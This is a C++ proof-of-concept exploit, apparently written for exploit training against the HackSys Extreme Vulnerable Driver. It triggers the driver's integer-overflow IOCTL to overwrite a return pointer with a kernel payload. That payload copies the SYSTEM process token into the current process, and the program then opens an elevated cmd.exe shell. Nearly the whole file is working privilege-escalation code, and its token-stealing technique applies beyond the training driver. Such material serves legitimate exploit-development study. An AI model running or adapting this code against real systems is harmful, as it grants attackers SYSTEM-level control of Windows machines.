#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <Psapi.h>
#pragma comment(lib, "ntdll.lib")
#pragma warning(disable : 6385)

#define HACKSYS_EVD_IOCTL_INTEGER_OVERFLOW		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x809, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_DEVICE_NAME				L"\\\\.\\HackSysExtremeVulnerableDriver"
#define	HACKSYS_EVD_OVERFLOW_INDEX			0x824
#define HACKSYS_EVD_MALLOC_SIZE				(HACKSYS_EVD_OVERFLOW_INDEX + (sizeof(void*) * 2))
#define HACKSYS_EVD_OVERFLOW_SIZE			0xFFFFFFFF

using PEPROCESS = PVOID;
using PKTHREAD = PVOID;
using DBGPRINT = ULONG(NTAPI*)(PCSTR, ...);
using KEGETCURRENTTHREAD = PKTHREAD(NTAPI*)();
using PSGETCURRENTPROCESSID = HANDLE(NTAPI*)();
using PSINITIALSYSTEMPROCESS = PVOID(NTAPI*)();
using IOGETCURRENTPROCESS = PEPROCESS(NTAPI*)();
using OBDEREFERENCEOBJECT = VOID(NTAPI*)(_In_ PVOID Object);
using MMGETSYSTEMROUTINEADDRESS = PVOID(NTAPI*)(_In_ PUNICODE_STRING);
using PSLOOKUPPROCESSBYPROCESSID = NTSTATUS(NTAPI*)(_In_ HANDLE, _Out_ PEPROCESS*);

DBGPRINT DbgPrint{};
MMGETSYSTEMROUTINEADDRESS MmGetSystemRoutineAddress{};
PSINITIALSYSTEMPROCESS PsInitialSystemProcess{};
PSLOOKUPPROCESSBYPROCESSID PsLookupProcessByProcessId{};
PSGETCURRENTPROCESSID PsGetCurrentProcessId{};
OBDEREFERENCEOBJECT ObDereferenceObject{};
IOGETCURRENTPROCESS IoGetCurrentProcess{};
KEGETCURRENTTHREAD KeGetCurrentThread{};


static auto NtkrnlpaBase() -> LPVOID {
	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;
	TCHAR lpfileName[1024];

	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);

	for (int i = 0; i < 1024; i++) {
		GetDeviceDriverBaseNameA(lpImageBase[i], (LPSTR)lpfileName, 48);

		if (!strcmp((LPSTR)lpfileName, "ntkrnlpa.exe")) {
			return lpImageBase[i];
		}
	}
	return NULL;
}

class POC {
private:
	template <class Resource, class Deleter> static
		std::unique_ptr<Resource, Deleter> make_unique_ex(Resource* p,
			Deleter d = Deleter()) {
		return std::unique_ptr<Resource, Deleter>(p, std::forward<Deleter>(d));
	}

	HANDLE hHandle;
	void* data;
	void* kernel_base;

public:
	
	explicit POC() : hHandle{ getDeviceHandle() }, data{ nullptr }, kernel_base{ nullptr } {
		std::cout << "Got handle to device with value : " << std::hex << hHandle << std::endl;
		if (hHandle == INVALID_HANDLE_VALUE)	exit(-1);
	}

	~POC() {
		if (data)	std::free(data);
		if (hHandle)	::CloseHandle(hHandle);
	}

	auto doPrimitive() -> void {
		/*
		* Resolve Kernel Addresses
		*/
		kernel_base = NtkrnlpaBase();

		DbgPrint = reinterpret_cast<DBGPRINT>(ResolveNtAddress("DbgPrint"));

		MmGetSystemRoutineAddress = reinterpret_cast<MMGETSYSTEMROUTINEADDRESS>
			(ResolveNtAddress("MmGetSystemRoutineAddress"));

		PsInitialSystemProcess = reinterpret_cast<PSINITIALSYSTEMPROCESS>
			(ResolveNtAddress("PsInitialSystemProcess"));

		PsLookupProcessByProcessId = reinterpret_cast<PSLOOKUPPROCESSBYPROCESSID>
			(ResolveNtAddress("PsLookupProcessByProcessId"));

		PsGetCurrentProcessId = reinterpret_cast<PSGETCURRENTPROCESSID>
			(ResolveNtAddress("PsGetCurrentProcessId"));

		ObDereferenceObject = reinterpret_cast<OBDEREFERENCEOBJECT>
			(ResolveNtAddress("ObDereferenceObject"));

		KeGetCurrentThread = reinterpret_cast<KEGETCURRENTTHREAD>
			(ResolveNtAddress("KeGetCurrentThread"));
	}

	auto triggerExploit() -> bool {
		doPrimitive();

		DWORD nBytes = 0;
		auto* data = malloc(HACKSYS_EVD_MALLOC_SIZE);
		if (!data)		return false;

		std::memset(data, 'A', HACKSYS_EVD_MALLOC_SIZE);

		void* eop = &startExploit; //TokenStealingPayloadWin7;
		*(void**)((byte*)data + HACKSYS_EVD_OVERFLOW_INDEX) = eop;
		*(std::uint32_t*)((byte*)data + HACKSYS_EVD_OVERFLOW_INDEX + sizeof std::uint32_t) = 0x0BAD0B0B0;

		auto returnValue = ::DeviceIoControl(hHandle, HACKSYS_EVD_IOCTL_INTEGER_OVERFLOW,
			static_cast<LPVOID>(data), HACKSYS_EVD_OVERFLOW_SIZE, nullptr, 0, &nBytes, nullptr);

		if (returnValue == 0) {
			std::printf("Failed with error code : %x.\n", GetLastError());
		}

		return returnValue;
	}

	auto ResolveNtAddress(PCSTR routineName) -> void* {
		if (!kernel_base)	return nullptr;

		HMODULE hUserSpaceBase = LoadLibraryA("ntkrnlpa.exe");
		if (hUserSpaceBase == nullptr)	return nullptr;

		void* pUserSpaceAddress = GetProcAddress(hUserSpaceBase, routineName);
		void* address = (void*)((std::uint32_t)kernel_base +
			((std::uint32_t)pUserSpaceAddress - (std::uint32_t)hUserSpaceBase));

		return address;
	}

	auto getDeviceHandle() -> HANDLE {
		auto handle = ::CreateFile(HACKSYS_EVD_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
			nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
		if (handle == nullptr || handle == INVALID_HANDLE_VALUE) exit(-1);

		return handle;
	}

	static auto startExploit() -> void {

		__asm pushad;

		//DbgPrint("Hello World\n");
		//DbgPrint("In future we will map our own kernel driver\n");

		// get pointer to eprocess
		auto systemEProcess = *(void**)PsInitialSystemProcess;
		
		auto systemProcessToken = *(void**)((byte*)systemEProcess + 0xf8);
		
		auto currHandle = PsGetCurrentProcessId();
		
		auto currThread = KeGetCurrentThread();
		
		// KTHREAD->ApcState->Process = KPROCESS
		auto currProcess = *(void**)((byte*)currThread + 0x50);
		
		// process->token 
		auto currProcessToken = *(void**)((byte*)currProcess + 0xf8);
		
		auto currProcessTokenOffset = ((byte*)currProcess + 0xf8);
		auto systemProcessTokenOffset = ((byte*)systemEProcess + 0xf8);
		*(void**)currProcessTokenOffset = *(void**)systemProcessTokenOffset;

	exit:
		__asm popad;
		__asm xor eax, eax;
		__asm add esp, 12;
		__asm pop ebp;
		__asm ret 8;
	}
};

auto createCmdShell() -> void {
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(nullptr, wzFilePath, nullptr, nullptr, false, CREATE_NEW_CONSOLE, nullptr,
		nullptr, (LPSTARTUPINFOW)&si, &pi);

	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

int main(int argc, char* argv[]) {
	POC poc{};
	poc.triggerExploit();
	createCmdShell();

	return 0;
}
